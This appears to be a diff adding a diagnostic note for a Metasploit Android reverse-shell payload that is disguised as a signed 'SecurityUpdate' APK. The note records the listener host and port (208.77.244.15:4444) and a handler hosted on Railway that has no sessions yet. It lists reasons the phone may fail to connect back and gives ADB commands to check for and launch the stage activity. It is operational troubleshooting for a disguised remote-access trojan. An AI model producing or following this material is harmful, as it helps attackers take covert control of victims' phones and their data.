@@ -1,0 +1,29 @@
+APK Diagnostic Information
+==========================
+
+Created: $(date)
+
+APK Details:
+- File: SecurityUpdate_Signed.apk
+- Size: 12KB
+- Signed: Yes (jarsigner)
+- LHOST: 208.77.244.15
+- LPORT: 4444
+
+Handler Status:
+- Running on Railway
+- Listening on 0.0.0.0:4444
+- No sessions yet
+
+Possible Issues:
+1. App needs to be LAUNCHED after install (not just installed)
+2. Network connectivity from mobile to 208.77.244.15:4444
+3. Firewall blocking outbound connections
+4. App permissions not granted
+
+Commands to test in mobile (via ADB):
+--------------------------------------
+adb shell pm list packages | grep metasploit
+adb shell am start -n com.metasploit.stage/.MainActivity
+adb logcat | grep metasploit
+
